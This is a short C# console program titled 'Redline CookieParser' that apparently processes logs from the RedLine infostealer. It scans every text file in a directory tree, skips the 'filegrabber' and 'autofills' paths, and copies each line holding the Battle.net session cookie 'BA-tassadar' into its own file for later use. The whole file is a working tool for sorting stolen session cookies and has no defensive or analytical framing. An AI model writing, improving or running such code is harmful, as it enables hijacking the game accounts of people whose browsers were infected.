namespace Battle.net_Cookie_Parser
{
    internal static class Program
    {
        public static void Main()
        {
            Console.Title = "Redline CookieParser | Battle.net | Files Left: 0";
            if (!Directory.Exists("Parsed")) Directory.CreateDirectory("Parsed");
            var allFiles = Directory.GetFiles(Directory.GetCurrentDirectory() + @"\", "*.txt*", SearchOption.AllDirectories).Where(s => !s.ToLower().Contains("filegrabber") && !s.ToLower().Contains("autofills"));
            var fileCount = allFiles.Count();
        
            foreach (var file in allFiles)
            {
                var readFile = File.ReadAllLines(file);
                foreach (var line in readFile)
                {
                    if (!line.Contains("	BA-tassadar	")) continue;
                
                    File.WriteAllText($@"Parsed\VeritySexy_{RandomString(25)}.txt", line);
                    Console.WriteLine($"{RandomString(10)} - Cookie Found! - {RandomString(10)}");
                }

                fileCount--;
                Console.Title = $"Redline CookieParser | Battle.net | Files Left: {fileCount}";
            }
        }
    
        private static readonly Random Random = new();
        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; return new string(Enumerable.Repeat(chars, length).Select(s => s[Random.Next(s.Length)]).ToArray());
        }
    }
}